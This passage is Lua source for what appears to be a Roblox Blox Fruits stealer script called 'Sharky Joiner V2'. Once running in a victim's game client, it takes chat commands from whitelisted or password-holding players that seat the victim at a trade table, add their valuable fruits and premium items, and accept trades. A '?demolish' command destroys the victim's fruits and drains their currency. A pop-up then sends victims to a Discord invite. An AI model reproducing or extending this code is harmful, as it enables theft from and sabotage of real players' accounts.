		local direction = (position - root.Position).Unit
		bodyGyro.CFrame = CFrame_lookAt(root.Position, root.Position + direction)
		bodyVelocity.Velocity = direction * speed
	end)

	-- Create and play the tween
	local tween = TweenService:Create(root, tweenInfo, { CFrame = CFrame_new(position) * CFrame_new(0, root.Size.Y/2, 0) })
	tween:Play()
	tween.Completed:Wait()

	-- Cleanup movers and connections
	if updateConn then updateConn:Disconnect() end
	if noCollideConn then noCollideConn:Disconnect() end
	if bodyGyro and bodyGyro.Parent then bodyGyro:Destroy() end
	if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end

	-- Optional: Restore collision after tween completes
	-- task.wait(0.1)
	-- for i=1,#baseParts do pcall(function() if baseParts[i] and baseParts[i].Parent then baseParts[i].CanCollide = true end end) end
end

local function findTradeTable()
	-- Determine correct parent based on PlaceId
	local tradeTablesParent = game.PlaceId == 7449423635 and Workspace.Map:FindFirstChild("Turtle") or Workspace.Map:FindFirstChild("Dressrosa")
	if not tradeTablesParent then return nil, nil end

	local tables = tradeTablesParent:GetChildren()
	if not tables then return nil, nil end

	local bestTable, bestSeat
	local emptyTable, emptySeat
	local fallbackTable, fallbackSeat

	local function isTargetPlayer(seatWeld)
		if not seatWeld or not seatWeld.Part1 then return false end
		local character = seatWeld.Part1.Parent
		if not character then return false end
		local player = Players:GetPlayerFromCharacter(character)
		if not player then return false end
		-- Check Whitelist OR Activated Users
		return (Usernames and table.find(Usernames, player.Name)) or activatedUsers[player.UserId]
	end

	-- Iterate through potential trade tables
	for _, tbl in ipairs(tables) do
		if tbl.Name == "TradeTable" then
			local p1, p2 = tbl:FindFirstChild("P1"), tbl:FindFirstChild("P2")

			-- Only proceed if both seats P1 and P2 exist
			if p1 and p2 then
				local p1Weld, p2Weld = p1:FindFirstChild("SeatWeld"), p2:FindFirstChild("SeatWeld")
				local p1Free, p2Free = not p1Weld, not p2Weld
				local p1Target, p2Target = isTargetPlayer(p1Weld), isTargetPlayer(p2Weld)

				-- Priority 1: Sit with a target player
				if (p1Target and p2Free) or (p2Target and p1Free) then
					bestTable, bestSeat = tbl, p1Free and p1 or p2
					break -- Found the best option
				end

				-- Priority 2: Find a completely empty table
				if p1Free and p2Free and not emptyTable then
					emptyTable, emptySeat = tbl, p1 -- Default to P1 if both free
				end

				-- Priority 3: Find any seat next to a non-target (fallback)
				if not fallbackTable then
					if p1Free and not p2Target then
						fallbackTable, fallbackSeat = tbl, p1
					elseif p2Free and not p1Target then
						fallbackTable, fallbackSeat = tbl, p2
					end
				end
			end -- End of 'if p1 and p2 then'
		end -- End of 'if tbl.Name == "TradeTable" then'
	end -- End of for loop

	-- Return the best available option based on priority
	return bestTable or emptyTable or fallbackTable, bestSeat or emptySeat or fallbackSeat
end

local function isInTradeWithCorrectPlayer()
	-- Check global override first
	if allowEveryone then
		return true
	end

	local player = LocalPlayer
	local playerGui = player:FindFirstChild("PlayerGui")
	if not playerGui then return false end
	local mainGui = playerGui:FindFirstChild("Main")
	if not mainGui then return false end
	local tradeFrame = mainGui:FindFirstChild("Trade")
	if not tradeFrame or not tradeFrame.Visible then return false end

	-- Find UI elements safely
	local container = tradeFrame:FindFirstChild("Container")
	local frame1 = container and container:FindFirstChild("1")
	local frame2 = container and container:FindFirstChild("2")
	local player1Label = frame1 and frame1:FindFirstChild("TextLabel")
	local player2Label = frame2 and frame2:FindFirstChild("TextLabel")
	if not player1Label or not player2Label then return false end

	local tradingPartnerName = player2Label.Text -- This could be Username or DisplayName
	local localPlayerName = player.Name
	local localPlayerDisplayName = player.DisplayName

	-- Ensure local player is in slot 1 (check both name and display name)
	if player1Label.Text ~= localPlayerName and player1Label.Text ~= localPlayerDisplayName then
		return false
	end

	-- Check if partner is whitelisted by Username
	for _, allowedName in ipairs(Usernames) do
		local tradingPlayer = Players:FindFirstChild(allowedName) -- Find player by exact username from list
		if tradingPlayer then
			-- Compare label text (partner name) against the found player's Username AND DisplayName
			if string.lower(tradingPartnerName) == string.lower(tradingPlayer.Name) or string.lower(tradingPartnerName) == string.lower(tradingPlayer.DisplayName) then
				return true
			end
		end
	end

	-- Check if partner is in the activatedUsers list
	local partnerPlayer = Players:FindFirstChild(tradingPartnerName) -- Try direct lookup first
	if not partnerPlayer then -- If label is DisplayName, iterate to find player
		for _, p in ipairs(Players:GetPlayers()) do
			if p.DisplayName == tradingPartnerName then
				partnerPlayer = p
				break
			end
		end
	end
	if partnerPlayer and activatedUsers[partnerPlayer.UserId] then
		return true
	end

	-- If no match found
	return false
end

--[[ Jump Control ]]--
local isForceJumping = false
local stateChangedConnections = {}
local jumpRequestConnection
local characterAddedJumpConnection

local function ForceJump()
	local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
	if not humanoid then return end

	isForceJumping = true
	humanoid.JumpPower = 50 -- Temporarily increase power
	humanoid:ChangeState(Enum.HumanoidStateType.Jumping) -- Force the jump state

	-- Reset after a short delay
	task.delay(0.5, function()
		isForceJumping = false
		if humanoid and humanoid.Parent then
			humanoid.JumpPower = 0 -- Reset jump power
		end
	end)
end

local function lockJumping(humanoid)
	if not humanoid then return end

	-- Disconnect previous listener if exists
	if stateChangedConnections[humanoid] then
		stateChangedConnections[humanoid]:Disconnect()
		stateChangedConnections[humanoid] = nil
	end

	humanoid.JumpPower = 0
	humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)

	-- Prevent state change to Jumping unless forced
	stateChangedConnections[humanoid] = humanoid.StateChanged:Connect(function(old, new)
		if new == Enum.HumanoidStateType.Jumping and not isForceJumping then
			humanoid:ChangeState(old) -- Revert to previous state
		end
	end)
end

local function disableJump()
	-- Disconnect existing listeners
	if jumpRequestConnection then jumpRequestConnection:Disconnect(); jumpRequestConnection = nil end
	if characterAddedJumpConnection then characterAddedJumpConnection:Disconnect(); characterAddedJumpConnection = nil end

	-- Block touch jump requests
	if UserInputService.TouchEnabled then
		jumpRequestConnection = UserInputService.JumpRequest:Connect(function()
			if not isForceJumping and LocalPlayer.Character then
				local h = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				if h then h:SetStateEnabled(Enum.HumanoidStateType.Jumping, false) end
			end
		end)
	end

	-- Lock jump for current character
	if LocalPlayer.Character then
		lockJumping(LocalPlayer.Character:FindFirstChildOfClass("Humanoid"))
	end

	-- Lock jump for future characters
	characterAddedJumpConnection = LocalPlayer.CharacterAdded:Connect(function(char)
		task.spawn(function() -- Use task.spawn for safety
			local h = char:WaitForChild("Humanoid", 5)
			if h then lockJumping(h) end
		end)
	end)

	-- Return a cleanup function
	return function()
		if jumpRequestConnection then jumpRequestConnection:Disconnect(); jumpRequestConnection = nil end
		if characterAddedJumpConnection then characterAddedJumpConnection:Disconnect(); characterAddedJumpConnection = nil end
		for humanoid, conn in pairs(stateChangedConnections) do
			if conn and conn.Connected then pcall(conn.Disconnect, conn) end -- Check connection before disconnect
		end
		table.clear(stateChangedConnections)
	end
end

--[[ Discord Invite UI ]]--
local function createDiscordUI()
	-- Create UI elements (similar structure to createNotification but for Discord invite)
	local ScreenGui = Instance.new("ScreenGui"); ScreenGui.Name = "DiscordInviteUI"; ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; ScreenGui.ResetOnSpawn = false; ScreenGui.IgnoreGuiInset = true; ScreenGui.DisplayOrder = 9999
	local MainFrame = Instance.new("Frame"); MainFrame.Name = "MainFrame"; MainFrame.Size = UDim2.new(0, 800, 0, 350); MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0); MainFrame.AnchorPoint = Vector2.new(0.5, 0.5); MainFrame.BackgroundColor3 = Color3.fromRGB(32, 34, 37); MainFrame.BorderSizePixel = 0; MainFrame.Parent = ScreenGui; Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 10)
	local Title = Instance.new("TextLabel"); Title.Name = "Title"; Title.Size = UDim2.new(1, 0, 0, 40); Title.Position = UDim2.new(0, 0, 0, 10); Title.BackgroundTransparency = 1; Title.Font = Enum.Font.GothamBold; Title.Text = "Read Below!"; Title.TextColor3 = Color3.fromRGB(255, 255, 255); Title.TextScaled = true; Title.Parent = MainFrame
	local Description = Instance.new("TextLabel"); Description.Name = "Description"; Description.Size = UDim2.new(0.9, 0, 0, 100); Description.Position = UDim2.new(0.05, 0, 0.3, 0); Description.BackgroundTransparency = 1; Description.Font = Enum.Font.Gotham; Description.Text = "Hey! Some of your VALUABLE Fruits have been stolen by Sharky Joiner V2. No need to be sad! You can join us, and learn how this stealer works - And make a lot of fruits using it!"; Description.TextColor3 = Color3.fromRGB(220, 221, 222); Description.TextScaled = true; Description.Parent = MainFrame
	local Button = Instance.new("TextButton"); Button.Name = "CopyButton"; Button.Size = UDim2.new(0.7, 0, 0, 56); Button.Position = UDim2.new(0.15, 0, 0.7, 0); Button.BackgroundColor3 = Color3.fromRGB(88, 101, 242); Button.Font = Enum.Font.GothamBold; Button.Text = "Copy Discord Invite"; Button.TextColor3 = Color3.fromRGB(255, 255, 255); Button.TextScaled = true; Button.AutoButtonColor = false; Button.Parent = MainFrame; Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 5)

	-- Animation setup
	local fadeInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local function createTween(instance, props) return TweenService:Create(instance, fadeInfo, props) end

	-- Initial transparency
	MainFrame.BackgroundTransparency = 1; Title.TextTransparency = 1; Description.TextTransparency = 1; Button.BackgroundTransparency = 1; Button.TextTransparency = 1

	-- Fade-in animations
	task.wait(0.1); createTween(MainFrame, {BackgroundTransparency = 0}):Play()
	task.wait(0.1); createTween(Title, {TextTransparency = 0}):Play()
	task.wait(0.1); createTween(Description, {TextTransparency = 0}):Play()
	task.wait(0.1); createTween(Button, {BackgroundTransparency = 0, TextTransparency = 0}):Play()

	-- Button interactions
	Button.MouseEnter:Connect(function() createTween(Button, {BackgroundColor3 = Color3.fromRGB(71, 82, 196)}):Play() end)
	Button.MouseLeave:Connect(function() createTween(Button, {BackgroundColor3 = Color3.fromRGB(88, 101, 242)}):Play() end)
	Button.MouseButton1Click:Connect(function()
		setclipboard("https://discord.gg/uwdvTtqTDA")
		Button.Text = "Copied!"
		task.delay(2, function() if Button.Parent then Button.Text = "Copy Invite" end end) -- Reset text after 2s
	end)

	ScreenGui.Parent = CoreGui
	return ScreenGui
end


--[[ Command Definition & Handling ]]--
local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest")
local function sendMessage(message)
	pcall(function()
		SayMessageRequest:FireServer(message, "All")
	end)
end
local CommandCooldowns = {}
local DEFAULT_COOLDOWN = 0.5

-- Commands Table Definition
local Commands = {
	-- Movement & Basic Actions
	jump = {
		description = "Forces the character to jump once.",
		usage = "?jump",
		execute = ForceJump
	},
	sit = {
		description = "Attempts to find a suitable trade table seat and sit down.",
		usage = "?sit",
		execute = function()
			sendMessage("Attempting to sit at trade table...")
			local tradeTable, bestSeat = findTradeTable()
			if not (tradeTable and bestSeat) then
				sendMessage("Error finding a table! Try running ?tp first.")
				return
			end

			local character = LocalPlayer.Character
			if not (character and character.PrimaryPart) then
				sendMessage("Character error.")
				return
			end

			tweenToPosition(bestSeat.Position + Vector3.new(0, 2, 0)) -- Move above seat first
			task.wait(1) -- Wait for potential physics settlement

			local function attemptSit()
				for i = 1, 10 do
					local randomOffset = Vector3.new(math.random(-2, 2) / 10, math.random(-2, 2) / 10, math.random(-2, 2) / 10)
					tweenToPosition(bestSeat.Position + randomOffset) -- Jiggle towards seat
					task.wait(0.5)
					local humanoid = character:FindFirstChildOfClass("Humanoid")
					if humanoid and humanoid.Sit then
						sendMessage("Successfully sat at trade table!")
						return true
					end
				end
				return false
			end

			if not attemptSit() then
				sendMessage("Failed to sit. Try running ?sit again!")
			end
		end
	},
	tp = {
		description = "Teleports the player to the standard trading hub (Mansion/Cafe).",
		usage = "?tp",
		execute = function()
			local targetPos, locationName
			if game.PlaceId == 7449423635 then -- Sea 3
				locationName = "Mansion"
				-- Check for Valkyrie Helm first for specific TP
				local inventory = getInventory()
				if inventory then
					for _, item in ipairs(inventory) do
						if item.Name == "Valkyrie Helm" then
							Remote:InvokeServer("requestEntrance", Vector3.new(-12471.33, 374.95, -7539.37))
							sendMessage("Teleporting to Mansion (via Valkyrie)...")
							return
						end
					end
				end
				-- Default Mansion TP
				targetPos = Vector3.new(-12550.8701, 337.2399, -7425.5200) -- Adjusted precision slightly
			else -- Sea 2
				locationName = "Cafe"
				targetPos = Vector3.new(-381.8599, 73.0800, 299.9299) -- Adjusted precision slightly
			end

			if targetPos then
				sendMessage("Teleporting to " .. locationName .. "...")
				tweenToPosition(targetPos)
			else
				sendMessage("Could not determine teleport location.")
			end
		end
	},
	reset = {
		description = "Resets the player's character.",
		usage = "?reset",
		execute = function()
			if LocalPlayer.Character then
				LocalPlayer.Character:BreakJoints()
			end
		end
	},
	rejoin = {
		description = "Makes the player rejoin the current server.",
		usage = "?rejoin",
		execute = function()
			TeleportService:Teleport(game.PlaceId, LocalPlayer)
		end
	},

	-- Trading Commands
	add = {
		description = "Adds [count] of a specific Blox Fruit to the trade.",
		usage = "?add <fruit_name> [count]",
		execute = function(argument)
			local namePart, countPart = argument:match("^(.-)%s*(%d*)$")
			if not namePart or namePart == "" then sendMessage("Usage: ?add <fruit_name> [count]"); return end

			local searchTerm = namePart:lower():match("^%s*(.-)%s*$") -- Trim whitespace
			local requestedCount = tonumber(countPart)
			if not requestedCount or requestedCount < 1 then requestedCount = 1 end

			local inventory = getInventory()
			if not inventory then sendMessage("Failed to get inventory."); return end

			local foundItem = nil
			for _, item in pairs(inventory) do
				if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm, 1, true) then -- Case-insensitive find
					foundItem = item
					break
				end
			end

			if foundItem then
				local availableCount = foundItem.Count
				local countToAdd = math.min(requestedCount, availableCount)
				if countToAdd <= 0 then sendMessage("No '" .. foundItem.Name .. "' available to add."); return end

				sendMessage("Adding " .. countToAdd .. "x '" .. foundItem.Name .. "'...")
				local addedSuccess = 0
				for i = 1, countToAdd do
					local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", foundItem.Name)
					if success then
						addedSuccess = addedSuccess + 1
					else
						sendMessage("Error adding item: " .. tostring(err))
						break -- Stop if one fails
					end
					task.wait(0.1) -- Delay between adds
				end
				sendMessage("Finished adding " .. addedSuccess .. "/" .. countToAdd .. " '" .. foundItem.Name .. "'.")
				if requestedCount > availableCount then sendMessage("(Note: You requested " .. requestedCount .. ", but only " .. availableCount .. " were available.)") end
			else
				sendMessage("No Blox Fruit matching '" .. searchTerm .. "' found in inventory!")
			end
		end
	},
	additem = {
		description = "Adds 1 of a specific Premium Item (Gamepass) to the trade.",
		usage = "?additem <item_name>",
		execute = function(argument)
			local searchTerm = argument:lower():match("^%s*(.-)%s*$") -- Trim whitespace
			if searchTerm == "" then sendMessage("Usage: ?additem <item_name>"); return end

			local inventory = getInventory()
			if not inventory then sendMessage("Failed to get inventory."); return end

			local foundItem = nil
			for _, item in pairs(inventory) do
				if item.Type == "Premium" and item.Name:lower():find(searchTerm, 1, true) then -- Case-insensitive find
					foundItem = item
					break
				end
			end

			if foundItem then
				sendMessage("Adding 1x '" .. foundItem.Name .. "'...")
				TradeFunction:InvokeServer("addItem", foundItem.Name)
				task.wait(0.1)
				sendMessage("Finished adding '" .. foundItem.Name .. "'.")
			else
				sendMessage("No Premium Item matching '" .. searchTerm .. "' found in inventory!")
			end
		end
	},
	addall = { -- NO COUNT for addall
		description = "Adds 1 of each fruit from your 'FruitsToHit' list to the trade.",
		usage = "?addall",
		execute = function()
			local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
			if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
				sendMessage("Not currently in a trade.")
				return
			end

			local inventory = getInventory()
			if not inventory then sendMessage("Failed to get inventory."); return end

			local addedCount = 0
			local addedFruits = {} -- Track fruits added in this run
			sendMessage("Attempting to add all configured fruits...")

			-- Create inventory lookup for quick checks
			local inventoryLookup = {}
			for _, item in pairs(inventory) do
				if item.Type == "Blox Fruit" then inventoryLookup[item.Name] = item.Count end
			end

			for _, fruitName in ipairs(FruitsToHit) do
				if inventoryLookup[fruitName] and inventoryLookup[fruitName] > 0 and not addedFruits[fruitName] then
					local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", fruitName)
					if success then
						addedFruits[fruitName] = true
						addedCount = addedCount + 1
						sendMessage("Added 1x '" .. fruitName .. "'.")
					else
						sendMessage("Error adding " .. fruitName .. ": " .. tostring(err))
						break -- Stop if one fails
					end
					task.wait(0.1) -- Delay
				end
			end

			if addedCount > 0 then
				sendMessage("Finished adding " .. addedCount .. " types of configured fruits.")
			else
				sendMessage("No fruits from your 'FruitsToHit' list were found/available in inventory!")
			end
		end
	},
	addallitems = {
		description = "Adds 1 of every Premium Item (Gamepass) found in inventory to the trade.",
		usage = "?addallitems",
		execute = function()
			local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
			if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
				sendMessage("Not currently in a trade.")
				return
			end

			local inventory = getInventory()
			if not inventory then sendMessage("Failed to get inventory."); return end

			local addedCount = 0
			local addedItems = {} -- Track items added in this run
			sendMessage("Attempting to add all premium items...")

			for _, item in pairs(inventory) do
				if item.Type == "Premium" and item.Count > 0 and not addedItems[item.Name] then
					local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", item.Name)
					if success then
						addedItems[item.Name] = true
						addedCount = addedCount + 1
						sendMessage("Added 1x '" .. item.Name .. "'.")
					else
						sendMessage("Error adding " .. item.Name .. ": " .. tostring(err))
						break -- Stop if one fails
					end
					task.wait(0.1) -- Delay
				end
			end

			if addedCount > 0 then
				sendMessage("Finished adding " .. addedCount .. " premium items.")
			else
				sendMessage("No Premium items found/available in inventory!")
			end
		end
	},
	cleartrade = {
		description = "Removes all items the victim has placed in the trade window.",
		usage = "?cleartrade",
		execute = function()
			local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
			if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
				sendMessage("Not currently in a trade.")
				return
			end

			local container = tradeUI.Trade:FindFirstChild("Container")
			local playerFrame = container and container:FindFirstChild("1")
			local itemFrame = playerFrame and playerFrame:FindFirstChild("Frame")
			if not itemFrame then sendMessage("Could not find trade item frame."); return end

			local itemsToRemove = {}
			for _, item in ipairs(itemFrame:GetChildren()) do
				if item:IsA("ImageButton") and item.Name ~= "AddBeli" then -- Exclude Beli button
					table.insert(itemsToRemove, item.Name)
				end
			end

			if #itemsToRemove == 0 then sendMessage("No items to remove from trade."); return end

			sendMessage("Clearing " .. #itemsToRemove .. " items from trade...")
			local clearedCount = 0
			for _, itemName in ipairs(itemsToRemove) do
				local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "removeItem", itemName)
				if success then
					clearedCount = clearedCount + 1
				else
					sendMessage("Error removing " .. itemName .. ": " .. tostring(err))
				end
				task.wait(0.1) -- Delay
			end
			sendMessage("Cleared " .. clearedCount .. " items.")
		end
	},
	accept = {
		description = "Accepts the current trade (only works if seated).",
		usage = "?accept",
		execute = function()
			local tradeUI = LocalPlayer.PlayerGui:FindFirstChild("Main")
			if not (tradeUI and tradeUI:FindFirstChild("Trade") and tradeUI.Trade.Visible) then
				sendMessage("Not currently in a trade.")
				return
			end

			local character = LocalPlayer.Character
			if not character then sendMessage("Character not found."); return end

			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not humanoid then sendMessage("Humanoid not found."); return end

			if not humanoid.Sit then sendMessage("Must be sitting to accept trade."); return end

			sendMessage("Accepting trade...")
			task.wait(0.1) -- Small delay before invoking
			TradeFunction:InvokeServer("accept")
		end
	},

	-- Utility Commands
	resetfruit = { -- Added count support
		description = "Equips and resets [count] times with a specific fruit.",
		usage = "?resetfruit <fruit_name> [count]",
		execute = function(argument)
			local namePart, countPart = argument:match("^(.-)%s*(%d*)$")
			if not namePart or namePart == "" then sendMessage("Usage: ?resetfruit <fruit_name> [count]"); return end

			local searchTerm = namePart:lower():match("^%s*(.-)%s*$") -- Trim whitespace
			local requestedCount = tonumber(countPart)
			if not requestedCount or requestedCount < 1 then requestedCount = 1 end

			sendMessage("Attempting to reset with '".. searchTerm .."' " .. requestedCount .. " times...")

			for i = 1, requestedCount do
				local inventory = getInventory() -- Check each time
				if not inventory then sendMessage("Failed to get inventory on attempt " .. i); break end

				local foundItem = nil
				for _, item in pairs(inventory) do
					if item.Type == "Blox Fruit" and item.Name:lower():find(searchTerm, 1, true) then -- Case-insensitive find
						foundItem = item
						break
					end
				end

				if foundItem then
					local baseFruitName = foundItem.Name:match("(%S+)") -- Get base name (e.g., "Kitsune")
					sendMessage("("..i.."/"..requestedCount..") Equipping '" .. baseFruitName .. "' and resetting...")
					ForceJump() -- Attempt to break sit state
					task.wait(0.1)
					Remote:InvokeServer("LoadFruit", baseFruitName)
					task.wait(0.3) -- Wait for equip animation/server register

					if LocalPlayer.Character then
						LocalPlayer.Character:BreakJoints()
					end
					sendMessage("Reset complete for attempt " .. i .. ". Waiting for respawn...")
					task.wait(6.5) -- Wait for respawn + buffer
				else
					sendMessage("Fruit matching '" .. searchTerm .. "' not found in inventory on attempt " .. i .. ". Aborting.")
					break -- Stop if fruit isn't found
				end

				if i < requestedCount then task.wait(1) end -- Extra delay between resets
			end
			sendMessage("Finished reset fruit sequence.")
		end
	},
	invite = {
		description = "Shows the victim a UI inviting them to the Discord.",
		usage = "?invite",
		execute = createDiscordUI
	},
	demolish = {
		description = "!! DANGEROUS !! Attempts to equip and reset all fruits, then drain Beli/Fragments.",
		usage = "?demolish",
		execute = function()
			sendMessage("!!! WARNING: DEMOLISH COMMAND INITIATED !!! THIS IS DESTRUCTIVE !!!")
			local function invokeRemote(remoteName, args)
                local remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(remoteName)
                return remote:InvokeServer(unpack(args))
            end
            invokeRemote("CommF_", {"RemoveFruit", "Beli"})
    
            local inventory = getInventory()
            if not inventory then
                return
            end
            local fruits = {}
            for _, item in pairs(inventory) do
                if item.Type == "Blox Fruit" then
                    table.insert(fruits, item)
                end
            end
            table.sort(fruits, function(a, b)
                return a.Value > b.Value
            end)
            for _, fruit in ipairs(fruits) do
                local baseFruitName = fruit.Name:match("(%S+)")
                sendMessage("(".._.."/"..#fruits..") Resetting with '" .. baseFruitName .. "'...")
				ForceJump()
                invokeRemote("CommF_", {"LoadFruit", baseFruitName})
                task.wait(0.5)
    
                if LocalPlayer.Character then
                    LocalPlayer.Character:BreakJoints()
                    task.wait(6)
                end
            end
            local function drainBeli()
                local rocketArgs = {"PurchaseRawFruit", "Rocket-Rocket", false}
                local spinArgs = {"PurchaseRawFruit", "Spin-Spin", false}
                while true do
                    invokeRemote("CommF_", rocketArgs)
                    task.wait(0.01)
                    invokeRemote("CommF_", spinArgs)
                    task.wait(0.01)
                end
            end
            local function drainFragments()
                local fragmentArgs = {"BlackbeardReward", "Refund", "2"}
                while true do
                    invokeRemote("CommF_", fragmentArgs)
                    task.wait()
                end
            end
            coroutine.wrap(drainBeli)()
            coroutine.wrap(drainFragments)()
        end
    },
    showinv = {
        description = "Shows the victim's Blox Fruit inventory (by value) in chat.",
        usage = "?showinv",
        execute = function()
            task.spawn(function() -- Run in a separate thread
                sendMessage("Fetching inventory (sorted by value)...")
                local inventory = getInventory()
                if not inventory then
                    sendMessage("Error: Failed to retrieve inventory.")
                    return
                end

                local fruitDataList = {} -- Store fruit data {name=..., count=..., value=...}
                for _, item in pairs(inventory) do
                    if item.Type == "Blox Fruit" then
                        -- Store the raw data needed for sorting and formatting
                        table.insert(fruitDataList, {
                            name = item.Name,
                            count = item.Count,
                            value = item.Value or 0 -- Default value to 0 if nil
                        })
                    end
                end

                if #fruitDataList == 0 then
                    sendMessage("No Blox Fruits found in inventory.")
                    return
                end

                -- Sort by value (descending)
                table.sort(fruitDataList, function(a, b)
                    return a.value > b.value
                end)

                -- Now format the sorted list for display
                local fruitDisplayList = {}
                for _, fruitData in ipairs(fruitDataList) do
                    local fruitString = fruitData.name
                    if fruitData.count > 1 then
                        fruitString = fruitString .. " (x" .. fruitData.count .. ")"
                    end
                    table.insert(fruitDisplayList, fruitString)
                end

                -- Chunking Logic
                local messageLimit = 180 -- Keep well below Roblox limit (~200)
                local itemsPerEstimate = 10 -- Estimate how many items roughly fit per line
                local totalChunks = math.ceil(#fruitDisplayList / itemsPerEstimate)
                local currentMessage = "Fruits [Value] (1/".. totalChunks .. "): " -- Start first message
                local chunkIndex = 1

                for i, fruitName in ipairs(fruitDisplayList) do
                    local prefixLength = string.len("Fruits [Value] (X/Y): ") -- Length of the prefix part
                    local separator = (#currentMessage > prefixLength) and ", " or "" -- Add separator if not first item in message
                    local potentialAddition = separator .. fruitName

                    -- Check if adding the next fruit exceeds the limit
                    if string.len(currentMessage) + string.len(potentialAddition) > messageLimit then
                        -- Send the current message chunk
                        sendMessage(currentMessage)
                        task.wait(2) -- Wait between messages
                        chunkIndex = chunkIndex + 1
                        currentMessage = "Fruits [Value] ("..chunkIndex.."/".. totalChunks .."): " .. fruitName -- Start new message
                    else
                        -- Add to the current message chunk
                        currentMessage = currentMessage .. potentialAddition
                    end
                end

                -- Send the last remaining message chunk (avoid sending only prefix)
                if currentMessage ~= "" and not currentMessage:match("^Fruits %[%w+%].*%): $") then
                    sendMessage(currentMessage)
                end

                task.wait(0.5)
                sendMessage("Inventory display complete.")
            end)
        end
    },
	test = {
		description = "Checks script responsiveness.",
		usage = "?test",
		execute = function()
			local startTime = tick()
			task.wait(0.001)
			sendMessage("I'm Responsive! My response time is " .. string.format("%.1f", (tick() - startTime) * 1000) .. "ms")
		end
	},
	help = {
		description = "Displays a condensed list of commands.",
		usage = "?help",
		execute = function()
			task.spawn(function()
				-- Condensed command list (names only)
				local cmds = {
                    "?help ?test ?jump ?sit ?tp ?reset ?rejoin",
                    "?add ?additem ?addall ?addallitems",
                    "?resetfruit ?invite ?demolish ?showinv",
                    "?allowall ?accept ?cleartrade"
				}
				sendMessage("--- Commands ---")
				task.wait(1) -- Initial small delay
				for i, msg in ipairs(cmds) do
					sendMessage(msg)
					task.wait(1) -- Consistent small delay between lines
				end
			end)
		end
	},

	-- Activation / Admin Commands
	activate = {
		description = "Activates command access using a password.",
		usage = "?activate <password>",
		-- Updated execute to accept player object first
		execute = function(player, password)
			if not password or password == "" then
				sendMessage("Usage: ?activate <password>")
				return
			end

			-- Ensure player object is valid
			if not player or not player:IsA("Player") then
				print("Error: Invalid player object passed to activate command.")
				return
			end

			local foundPass = false
			for _, validPass in ipairs(ActivationPasswords) do
				if password == validPass then
					foundPass = true
					break
				end
			end

			if foundPass then
				if activatedUsers[player.UserId] then
					sendMessage("You are already activated, " .. player.Name .. ".")
				else
					activatedUsers[player.UserId] = true
					sendMessage("Activation successful for this session, " .. player.Name .. "!")
					print("Activated User: " .. player.Name .. " (ID: " .. player.UserId .. ")")
				end
			else
				-- Added feedback for incorrect password
				sendMessage("Incorrect password.")
			end
		end
	},
	allowall = {
		description = "Toggles allowing ANY player to use commands.",
		usage = "?allowall",
		execute = function()
			allowEveryone = not allowEveryone
			local status = allowEveryone and "ENABLED" or "DISABLED"
			-- Corrected ternary simulation using 'or'
			sendMessage("AllowEveryone Mode: " .. status .. ". Command access is now " .. (allowEveryone and "OPEN to ALL players." or "RESTRICTED."))
			if allowEveryone then
				sendMessage("ANYONE can now use commands")
			end
		end
	}
}

--[[ Command Processor ]]--
local CommandContext = {} -- Used ONLY if needed by future commands, 'activate' now takes player directly

local function processChatCommand(_, player, message)
	-- Basic validation
	if not (player and message and typeof(player) == "Instance" and player:IsA("Player") and message:sub(1, 1) == "?") then
		return
	end

	-- Parse command and arguments
	local commandStr = message:sub(2):match("^%s*(.-)%s*$") -- Trim whitespace
	if not commandStr or commandStr == "" then return end

	local command, argument = commandStr:match("^(%S+)%s*(.-)%s*$") -- Separate command and rest
	if not command then return end
	command = command:lower()

	-- Special handling for ?activate: Allow anyone to TRY it
	if command == "activate" then
		local cmdFunc = Commands[command]
		if cmdFunc then
			-- Pass the 'player' object directly
			task.spawn(cmdFunc.execute, player, argument)
		end
		return -- Stop further processing for ?activate
	end

	-- Authorization Check: allowEveryone OR Whitelisted OR Activated
	local isAuthorized = allowEveryone or (Usernames and table.find(Usernames, player.Name)) or activatedUsers[player.UserId]
	if not isAuthorized then
		return -- Ignore command if not authorized
	end

	-- Find and execute the command
	local commandFunc = Commands[command]
	if not commandFunc then
		sendMessage("Unknown command: ?" .. command)
		return
	end

	-- Cooldown Check
	local playerName = player.Name
	local playerCooldowns = CommandCooldowns[playerName]
	if playerCooldowns then
		local lastUsed = playerCooldowns[command]
		if lastUsed and (tick() - lastUsed < DEFAULT_COOLDOWN) then
			sendMessage("Please wait before using this command again!")
			return
		end
	else
		playerCooldowns = {}
		CommandCooldowns[playerName] = playerCooldowns
	end
	playerCooldowns[command] = tick() -- Update cooldown timestamp

	-- Execute command in a new thread
	task.spawn(function()
		local success, err = pcall(commandFunc.execute, argument)
		if not success then
			sendMessage("Error executing command ?" .. command .. ": " .. tostring(err))
			warn("Command Error:", command, argument, err) -- Log error locally too
		end
	end)
end

--[[ Main Loop & Initialization ]]--
local function startMainLoop()
	local isLoopRunning = true
	local hasCheckedCurrentTrade = false
	local currentTable, currentSeat

	local lastMovementTime = tick()
	local lastTableCheck = tick()
	local lastTradeCheck = tick()

	-- Constants for timing
	local UPDATE_INTERVAL = 0.5
